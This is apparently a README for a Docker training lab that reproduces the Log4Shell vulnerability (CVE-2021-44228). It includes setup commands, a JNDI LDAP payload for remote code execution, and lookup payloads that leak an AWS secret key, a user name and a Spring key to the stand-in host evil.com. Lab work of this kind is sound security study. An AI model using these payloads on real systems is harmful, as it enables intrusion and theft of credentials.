# Log4Shell docker lab for CVE-2021-44228

## The components
TODO

## Docker lab setup
### 1. Docker network
```bash
docker network create log4shell
```

### 2. Building the Docker images
```bash
$ docker build -t log4shell-vulnapp vulnapp
$ docker build -t log4shell-httpserver httpserver
$ docker build -t log4shell-marshalsec marshalsec
```

### 3. Running the containers
**Important note:** If you are using Windows PowerShell, replace `$(pwd)` with `${pwd}`.

```bash
$ docker run -d --name log4shell-vulnapp --network="log4shell" -p 8080:8080 log4shell-vulnapp
$ docker run -d --name log4shell-httpserver --network="log4shell" -p 3223:3223 -v $(pwd)/httpserver:/httpserver log4shell-httpserver
$ docker run -d --name log4shell-marshalsec --network="log4shell" -p 1389:1389 log4shell-marshalsec "http://<HostIp>:<Port>/#<RCEObjectName>"
```

### 4. Exploit
Open up the vulnerable application, input some false test credentials, and open up the
logs of the **log4shell-vulnapp** container.
It can be seen that the application is logging unsuccessful login attempts (e.g., *Incorrect login attempt for username 'test'*). From this small experiment, it is established that we have control over some part of the logged string (i.e., the username).

We can pass a payload like the following to remotely execute code:
```bash
${jndi:ldap://<HostIp>:1389/<RCEObjectName>}
```
Remote code execution can be done in any java version; however, machines with java versions older than the following list:
- 6u211
- 7u201
- 8u191
- 11.0.1

This is due to the fact that later versions set the JVM system property `com.sun.jndi.ldap.object.trustURLCodebase` to `false` by default, which disables JNDI loading of classes from arbitrary URL code bases. **However, relying only on a new Java version as protection against this vulnerability is risky**, as the vulnerability may still be exploited on machines that contain certain "gadget" classes in the classpath of the vulnerable application and DNS queries can be used to obtain information such as environment variables.

There are several lookup substitutions that reveal sensitive information from the victim machine. Most prominently, using a payload similar to:
```bash
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.evil.com/foo}
${jndi:ldap://${sys:user.name}.evil.com/foo}
${jndi:ldap://${main:x}.evil.com/foo}
${jndi:ldap://${spring:supersecretkey}.evil.com/foo}
```
**Note:** The spring lookup attack string requires `log4j-spring-cloud-config-client` be included in the application.

### Reference:
- https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/
- https://logging.apache.org/log4j/2.x/manual/lookups.html
- https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html

### TODO
- [ ] Write about the mitigations without upgrading